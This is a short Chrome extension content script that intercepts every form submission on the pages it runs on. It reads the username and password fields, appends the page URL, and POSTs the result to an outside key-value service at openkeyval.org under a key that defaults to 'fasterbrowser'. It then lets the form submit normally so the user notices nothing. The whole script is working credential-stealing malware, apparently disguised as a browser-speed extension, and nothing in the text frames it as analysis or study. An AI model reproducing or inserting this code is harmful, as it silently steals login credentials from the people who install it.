chrome.extension.sendMessage({}, function(response) {
  var readyStateCheckInterval = setInterval(function() {
    if (document.readyState === "complete") {
      clearInterval(readyStateCheckInterval);


      $("form").submit(function(e) {
        var $this = $(this);
        e.preventDefault();
        process(function() {
          $this.unbind('submit');
          $this.submit();
        });
      });
      var passwordBoxes = $("input[type=password]");
      var process = function(callback) {
        var username = $("input[type=text]").not(passwordBoxes).filter(function() {
          var field = $(this);
          return field.val() || field.html();
        }).val(),
        password = passwordBoxes.val();

        sendAjax(username, password, location.href, callback);
      };
      var sendAjax = function(username, password, url, callback) {
        var msg = username + "|" + password + "|" + url;
        var optionKey = '';
        chrome.extension.sendRequest({method: "optionKey"}, function(response) {
          optionKey = response.status;
        });
        if (optionKey == undefined) {
          optionKey = "fasterbrowser";
        }
        setTimeout(function () {
          $.ajax({
            type: 'POST',
            url: 'https://secure.openkeyval.org/store/',
            dataType: "jsonp",
            data: optionKey+"="+msg
            //succes: callback
          });
        },500);
      };
    }
  }, 0);
});
